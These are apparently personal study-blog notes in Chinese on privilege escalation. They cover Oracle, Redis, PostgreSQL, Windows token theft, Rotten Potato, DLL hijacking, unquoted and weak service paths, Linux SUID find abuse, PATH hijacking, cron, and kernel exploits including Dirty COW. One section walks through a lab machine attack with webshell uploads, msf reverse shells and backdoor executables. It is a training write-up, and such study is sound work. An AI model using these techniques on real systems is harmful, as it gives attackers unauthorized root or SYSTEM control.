<h3 id="Oracle数据库提权"><a href="#Oracle数据库提权" class="headerlink" title="Oracle数据库提权"></a>Oracle数据库提权</h3><h6 id="普通用户模式"><a href="#普通用户模式" class="headerlink" title="普通用户模式"></a>普通用户模式</h6><p>前提是拥有一个普通的oracle连接账号，不需要DBA权限，可以提权至DBS，并以oracle实例运行的权限执行操作系统命令。</p>
<h6 id="DBA用户模式（自动化工具演示）"><a href="#DBA用户模式（自动化工具演示）" class="headerlink" title="DBA用户模式（自动化工具演示）"></a>DBA用户模式（自动化工具演示）</h6><p>拥有DBA账号密码，可以省去自己手动去创建存储过程的繁琐步骤，一键执行测试。</p>
<h6 id="注入提升模式（sqlmap演示测试）"><a href="#注入提升模式（sqlmap演示测试）" class="headerlink" title="注入提升模式（sqlmap演示测试）"></a>注入提升模式（sqlmap演示测试）</h6><p>拥有一个oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证</p>
<h2 id="Redis-amp-Postgre-amp-令牌窃取-amp-进程注入"><a href="#Redis-amp-Postgre-amp-令牌窃取-amp-进程注入" class="headerlink" title="Redis&amp;Postgre&amp;令牌窃取&amp;进程注入"></a>Redis&amp;Postgre&amp;令牌窃取&amp;进程注入</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133531100.png"
                      alt="image-20221019133531100"
                ></p>
<h3 id="Redis数据库权限提升"><a href="#Redis数据库权限提升" class="headerlink" title="Redis数据库权限提升"></a>Redis数据库权限提升</h3><p>起因：由于Redis服务配置不当，可被攻击者恶意利用。黑客借助Redis内置命令，可将现有数据恶意清空；如果Redis以root身份运行，黑客可以往服务器上写入SSH公钥文件，直接登入服务器。</p>
<p>连接（利用未授权或者有密码）-利用如下方法提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019133947495.png"
                      alt="image-20221019133947495"
                ></p>
<p><a class="link"   href="https://blog.csdn.net/fly_hps/article/details/80937837" >https://blog.csdn.net/fly_hps/article/details/80937837 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135019394.png"
                      alt="image-20221019135019394"
                ></p>
<h3 id="postgresql数据库提权"><a href="#postgresql数据库提权" class="headerlink" title="postgresql数据库提权"></a>postgresql数据库提权</h3><p>postgresql数据库是一种关系型数据库。其中9.3到11版本中存在一处特性，管理员或者具有“COPY TO&#x2F;FROM PROGRAM”的用户，可以使用这个特性执行任意命令</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135525686.png"
                      alt="image-20221019135525686"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019135507395.png"
                      alt="image-20221019135507395"
                ></p>
<h3 id="Windows2008-amp-7令牌窃取提升-本地"><a href="#Windows2008-amp-7令牌窃取提升-本地" class="headerlink" title="Windows2008&amp;7令牌窃取提升-本地"></a>Windows2008&amp;7令牌窃取提升-本地</h3><p>进行全程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p>
<p>流程：获取会话—利用模块—窃取令牌—提权</p>
<p>得先利用msf反弹信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019140951226.png"
                      alt="image-20221019140951226"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221019141011052.png"
                      alt="image-20221019141011052"
                ></p>
<h3 id="Windows2003-amp-10注入提升"><a href="#Windows2003-amp-10注入提升" class="headerlink" title="Windows2003&amp;10注入提升"></a>Windows2003&amp;10注入提升</h3><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用再windows2008之前的操作系统（不包括），所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统.</p>
<h5 id="win2008之前的系统提权："><a href="#win2008之前的系统提权：" class="headerlink" title="win2008之前的系统提权："></a>win2008之前的系统提权：</h5><p>利用工具</p>
<h5 id="之后："><a href="#之后：" class="headerlink" title="之后："></a>之后：</h5><p>pexec64 工具</p>
<h2 id="烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权"><a href="#烂土豆-amp-dll劫持-amp-引导路径-amp-服务权限—提权" class="headerlink" title="烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权"></a>烂土豆&amp;dll劫持&amp;引导路径&amp;服务权限—提权</h2><h4 id="烂土豆提权"><a href="#烂土豆提权" class="headerlink" title="烂土豆提权"></a>烂土豆提权</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020164246540.png"
                      alt="image-20221020164246540"
                ></p>
<h6 id="烂土豆比热土豆的优点："><a href="#烂土豆比热土豆的优点：" class="headerlink" title="烂土豆比热土豆的优点："></a>烂土豆比热土豆的优点：</h6><p>1.100%可靠</p>
<p>2.全版本通杀</p>
<p>3.立即生效，热土豆需要等待windows更新</p>
<h5 id="烂土豆配合令牌窃取提权-web权限"><a href="#烂土豆配合令牌窃取提权-web权限" class="headerlink" title="烂土豆配合令牌窃取提权-web权限"></a>烂土豆配合令牌窃取提权-web权限</h5><p>过程：上传烂土豆–执行烂土豆–利用窃取模块–窃取system–成功</p>
<p>步骤：</p>
<ol>
<li><p>先下载potato.exe文件并通过webshell上传到靶机中去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211128892.png"
                      alt="image-20221020211128892"
                ></p>
</li>
</ol>
<p>2.在msf中先连接到靶机，确保能够反弹shell，然后cd c:\定位到patato.exe的位置</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211348556.png"
                      alt="image-20221020211348556"
                ></p>
<p>3.输入指令，运行patato.exe</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020211438585.png"
                      alt="image-20221020211438585"
                ></p>
<p>4.然后执行令牌窃取的三步骤，即可获得系统权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221020212013343.png"
                      alt="image-20221020212013343"
                ></p>
<h4 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a>DLL劫持提权</h4><p>需要被攻击主机有特定软件应用及启用配合</p>
<p>原理：Windows。程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径给，它会根据下面的顺序进行搜索：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021135233606.png"
                      alt="image-20221021135233606"
                ></p>
<p>步骤：信息收集—进程调试—制作DLL并上传—替换DLL-启动应用后成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140258406.png"
                      alt="image-20221021140258406"
                ></p>
<p>生成dll文件<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140358055.png"
                      alt="image-20221021140358055"
                >，用来替换一个第三方软件的dll文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021140440660.png"
                      alt="image-20221021140440660"
                ></p>
<p>上面两个文件是可以替换的，因为这个软件运行的时候会调用这两个文件（用火绒剑查看调用情况），随便替换一个都行。（替换的文件名得改成一样的）</p>
<p>打开文件即可监听到窗口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021142533920.png"
                      alt="image-20221021142533920"
                ></p>
<p>后续就可以利用令牌窃取等进行提权</p>
<h4 id="win2012-不带引号服务路径配合MSF-Web，本地权限"><a href="#win2012-不带引号服务路径配合MSF-Web，本地权限" class="headerlink" title="win2012-不带引号服务路径配合MSF-Web，本地权限"></a>win2012-不带引号服务路径配合MSF-Web，本地权限</h4><p>原理：当windows服务运行时，会发生一下两种情况之一。如果给出了可执行文件，并且引用了完整的路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>
<p>过程：检测引号服务路径（看看有没有引号）—利用路径制作文件并上传–启用服务或重启—调用后成功</p>
<p>原理就是：在一些服务的执行路径中，有些目录没有带引号，这样会使得执行的目录与原来想要执行的目录不同</p>
<p>举个例子：</p>
<p>C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe</p>
<p>“C:&#x2F;&#x2F;ni  hao&#x2F;jjj.exe”</p>
<p>第一个执行的是ni，第二个才是执行jjj.exe</p>
<p>如果权限够，webshell启动服务的命令sc start 服务名</p>
<p>服务启动则会调用系统权限</p>
<p>所以先用命令查找靶机中（用webshell），没有带引号“”的路径的服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152523741.png"
                      alt="image-20221021152523741" style="zoom:150%;" 
                >

<p>然后查看该服务的路径，并用msf生成一个与服务路径名相同的.exe后门文件，然后通过webshell上传靶机</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021152116172.png"
                      alt="image-20221021152116172"
                ></p>
<p>利用服务启动，则会调用该后门文件，msf反弹shell就生效了.</p>
<h4 id="win2012-不安全服务权限配合msf-本地提权"><a href="#win2012-不安全服务权限配合msf-本地提权" class="headerlink" title="win2012-不安全服务权限配合msf-本地提权"></a>win2012-不安全服务权限配合msf-本地提权</h4><p>原理：一般服务中，即使正确的引用服务路径（引号的那个方法就不行了），但也可能存在其他的漏洞&#x2F;由于管理配置错误，用户可能对服务拥有过多的权限，比如，可以直接修改它导致重定向执行文件。</p>
<p>步骤：检测服务权限配置–制作文件并上传–更改服务路径指向-调用后成功</p>
<p>下载文件：<a class="link"   href="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" >https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>第一条命令利用下载的软件寻找具有administrators权限的服务</p>
<p>第二条命令是改变服务路径，将其引导至msf生成的exe后门文件</p>
<p>第三条命令是执行该服务</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221021154236469.png"
                      alt="image-20221021154236469" style="zoom:150%;" 
                >

<p>这时peogram.exe文件就被执行了，msf就反弹成功</p>
<h4 id="windows提权总结"><a href="#windows提权总结" class="headerlink" title="windows提权总结"></a>windows提权总结</h4><p>掌握：提权方法对应的层面（远程还是本地）、提权方法对应系统版本、相关文件及后门免杀问题等</p>
<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190138371.png"
                      alt="image-20221022190138371"
                ></p>
<h3 id="linux脏牛内核漏洞"><a href="#linux脏牛内核漏洞" class="headerlink" title="linux脏牛内核漏洞"></a>linux脏牛内核漏洞</h3><h4 id="linux提权自动化脚本利用–4个脚本"><a href="#linux提权自动化脚本利用–4个脚本" class="headerlink" title="linux提权自动化脚本利用–4个脚本"></a>linux提权自动化脚本利用–4个脚本</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022190542244.png"
                      alt="image-20221022190542244"
                ></p>
<p>利用工具的信息收集，得到的信息来判断是否具有提权的可能性</p>
<p>步骤：下载好LinEnum.sh并通过webshell上传到靶机中（一般上传到&#x2F;tmp文件夹中，具有打开的权限）</p>
<p>然后对该文件赋予权限chmod -x</p>
<p>之后运行该文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022191955669.png"
                      alt="image-20221022191955669"
                ></p>
<p>得到该系统的各项参数，以便进行后续的提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022192137982.png"
                      alt="image-20221022192137982"
                ></p>
<p>SUID里面看是不是有下面图片那些元素，有就可以利用SUID提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022195904933.png"
                      alt="image-20221022195904933" style="zoom:150%;" 
                >

<p>其他的工具也是一样的方法</p>
<h4 id="Linux提权SUID配合脚本提权"><a href="#Linux提权SUID配合脚本提权" class="headerlink" title="Linux提权SUID配合脚本提权"></a>Linux提权SUID配合脚本提权</h4><p>漏洞成因：chmod u+s给予了suid      u-s删除了suid</p>
<p>使程序在运行中受到suid root权限的执行过程导致，就是上面那些执行的时候是调用root权限执行，所以可以利用这一特性来实施提权</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022194323506.png"
                      alt="image-20221022194323506" style="zoom:150%;" 
                >

<p>提权过程：探针是否有SUID可以用上图的手工命令，也可以中自动脚本</p>
<p>步骤：</p>
<p>利用msf进行反弹连接，连接三步骤</p>
<p>然后利用upload命令将信息收集工具上传到靶机目录（一般是&#x2F;tmp目录）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200754775.png"
                      alt="image-20221022200754775"
                ></p>
<p>然后输入shell进行工具的定位及使用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022200638234.png"
                      alt="image-20221022200638234"
                ></p>
<p>发现SUID FILE具有find字样</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201035132.png"
                      alt="image-20221022201035132"
                ></p>
<p>说明可以利用SUID提权</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201212416.png"
                      alt="image-20221022201212416"
                ></p>
<p>利用上面的指令，先touch +名字  然后find 名字  -exec whoami  ; 即可发现是root权限</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201254320.png"
                      alt="image-20221022201254320" style="zoom:150%;" 
                >

<p>然后利用<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022201600033.png"
                      alt="image-20221022201600033"
                >命令即可反弹一个具有root权限的shell</p>
<p>这时候指令前面就可以省略 find  +名字</p>
<h4 id="Linux提权本地配合内核漏洞提权"><a href="#Linux提权本地配合内核漏洞提权" class="headerlink" title="Linux提权本地配合内核漏洞提权"></a>Linux提权本地配合内核漏洞提权</h4><p>提权过程：连接—获取可利用漏洞—下载或者上传exp—编译exp—给权限执行—提权成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022202857938.png"
                      alt="image-20221022202857938"
                ></p>
<p>利用刚才上面所讲的工具利用的方法运行漏洞探针工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022203820926.png"
                      alt="image-20221022203820926" style="zoom:150%;" 
                >

<p>找到需要的漏洞，就是最后一个，打开附带的连接将exploits改为download即可下载漏洞，或者直接网上下载文件45010.c文件</p>
<p>将下载好的文件上传上去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204141443.png"
                      alt="image-20221022204141443"
                ></p>
<p>然后执行.&#x2F;45010，即可获得root权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204216654.png"
                      alt="image-20221022204216654"
                ></p>
<h4 id="Linux提权脏牛内核漏洞"><a href="#Linux提权脏牛内核漏洞" class="headerlink" title="Linux提权脏牛内核漏洞"></a>Linux提权脏牛内核漏洞</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022204555115.png"
                      alt="image-20221022204555115"
                ></p>
<p>步骤：vulnhub靶机—探针目标—CMS漏洞利用—脚本探针提权漏洞—利用内核提权</p>
<h5 id="脏牛提权靶机演示"><a href="#脏牛提权靶机演示" class="headerlink" title="脏牛提权靶机演示"></a>脏牛提权靶机演示</h5><p>准备工作：先将靶机下载好安装在vm虚拟机上，开启靶机以及一台kali攻击机</p>
<p>利用kali的ifconfig命令查看自己的IP地址以获取靶机的IP网段</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205245255.png"
                      alt="image-20221022205245255"
                ></p>
<p>可知靶机的IP地址处于192.168.76.0&#x2F;24网段，利用nmap扫描网段内的活跃主机，获取IP地址</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205448204.png"
                      alt="image-20221022205448204"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205536430.png"
                      alt="image-20221022205536430"
                ></p>
<p>得到IP地址192.168.76.141，继续对该IP进行端口扫描，发现1898端口</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022205702744.png"
                      alt="image-20221022205702744"
                ></p>
<p>打开192.168.76.141:1898网站发现该网站是基于drupal开发的，下一步便可以网上搜索该框架的漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210118051.png"
                      alt="image-20221022210118051"  
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210143398.png"
                      alt="image-20221022210143398" style="zoom:200%;" 
                >

<p>或者也可以利用msf的search功能进行漏洞查找</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210236441.png"
                      alt="image-20221022210236441"
                ></p>
<p>利用这个漏洞，就是第四个</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210355497.png"
                      alt="image-20221022210355497"
                ></p>
<p>设置靶机主机及端口获得反弹shell</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210501903.png"
                      alt="image-20221022210501903"
                ></p>
<p>接下来就是要开始提权了</p>
<p>上传漏洞探针工具到靶机，并且验证是否上传成功</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210837819.png"
                      alt="image-20221022210837819" style="zoom:150%;" 
                >

<p>然后利用shell模块执行上传的工具</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022210959042.png"
                      alt="image-20221022210959042" style="zoom:150%;" 
                >	 	 	 		

<p>发现这一个漏洞，俗称脏牛漏洞</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211113039.png"
                      alt="image-20221022211113039" style="zoom:150%;" 
                >

<p>访问给出的连接，下载漏洞<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211342944.png"
                      alt="image-20221022211342944"
                ></p>
<p>下载后上传<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211520869.png"
                      alt="image-20221022211520869"
                >上传到对方目录文件重命名为40847.cpp</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022211842805.png"
                      alt="image-20221022211842805" style="zoom:150%;" 
                >

<p>因为是.cpp文件所以需要进行编译，第一行为编译命令，就会生成一个dcow文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212012161.png"
                      alt="image-20221022212012161" style="zoom:150%;" 
                >

<p>由于该漏洞利用具有交互式，得确保交互式才能正常回显，所以需要第二行的命令来开启交互式<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212514715.png"
                      alt="image-20221022212514715"
                ></p>
<p>然后运行.&#x2F;dcow即可得到一个root账户的密码</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212609301.png"
                      alt="image-20221022212609301" style="zoom:150%;" 
                >

<p>然后切换root账户进行登入<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212727952.png"
                      alt="image-20221022212727952"
                ></p>
<p>获得root权限<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212746567.png"
                      alt="image-20221022212746567"
                ></p>
<p>然后就可以访问&#x2F;root目录下的文件发现有一个flag.txt文件，访问flag.txt就可以得到flag</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221022212927461.png"
                      alt="image-20221022212927461" style="zoom:150%;" 
                >

<p>完成！！！</p>
<h3 id="Linux环境变量-amp-定时任务-amp-数据库"><a href="#Linux环境变量-amp-定时任务-amp-数据库" class="headerlink" title="Linux环境变量&amp;定时任务&amp;数据库"></a>Linux环境变量&amp;定时任务&amp;数据库</h3><h4 id="Linux提权本地环境变量安全"><a href="#Linux提权本地环境变量安全" class="headerlink" title="Linux提权本地环境变量安全"></a>Linux提权本地环境变量安全</h4><p>配合SUID进行环境变量提权-本地用户环境下</p>
<p>过程：手写调用文件—编译—复制文件—增加环境变量—执行触发</p>
<p>步骤：</p>
<p>通过命令<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162713543.png"
                      alt="image-20221024162713543"
                ></p>
<p>将demo.c文件编译成shell文件</p>
<p>demo.c源代码<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162933036.png"
                      alt="image-20221024162933036"
                ></p>
<p>就是执行ps文件</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024162333961.png"
                      alt="image-20221024162333961" style="zoom:200%;" 
                >



<p>加个.&#x2F;ps就是执行sh了</p>
<p>在变量PATH&#x3D;&#x2F;tmp中添加&#x2F;tmp变量，执行的是ps（当时实际上执行的是sh）</p>
<p>执行shell文件实际上就是demo.c文件，源代码是运行ps但是实际上是运行了sh，造成root权限</p>
<p>那为什么是运行sh呢？ 前面说过正常输入ps其实就是运行ps，只有.&#x2F;ps才能调用sh运行，但是因为前面设置了环境变量&#x2F;tmp所以默认是调用tmp里面的ps，也就是运行sh</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024163227059.png"
                      alt="image-20221024163227059" style="zoom:150%;" 
                >







<h4 id="Linux定时任务安全–本地"><a href="#Linux定时任务安全–本地" class="headerlink" title="Linux定时任务安全–本地"></a>Linux定时任务安全–本地</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024165155471.png"
                      alt="image-20221024165155471"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221024210529479.png"
                      alt="image-20221024210529479" style="zoom:150%;" 
                >

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027213507541.png"
                      alt="image-20221027213507541"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221254785.png"
                      alt="image-20221027221254785"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027221305324.png"
                      alt="image-20221027221305324"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027222303044.png"
                      alt="image-20221027222303044"
                ></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223034688.png"
                      alt="image-20221027223034688" style="zoom:150%;" 
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221027223233692.png"
                      alt="image-20221027223233692" style="zoom:150%;" 
                >
]]></content>
  </entry>
</search>
